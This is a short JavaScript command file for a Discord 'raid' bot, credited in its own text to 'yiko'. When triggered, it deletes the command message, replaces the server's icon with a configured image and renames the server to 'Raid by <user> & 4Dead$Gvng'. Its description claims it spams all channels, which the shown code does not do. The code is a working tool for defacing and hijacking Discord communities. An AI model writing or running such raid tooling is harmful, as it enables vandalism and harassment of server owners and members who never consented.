const config = require("../config.json")

const foto = config.FotoDelServer

module.exports = {
  name: 'server',
  description: 'spam all channels on server with your config!',
  execute(message, args) {
    message.delete()

        process.title = `Server command executed | Bot raid created by yiko`


    process.title = ` Mass send all channels | Bot raid created by yiko `

    message.guild.setIcon(foto)
    message.guild.setName(`Raid by ${message.author.username} & 4Dead$Gvng`)

    }
  }
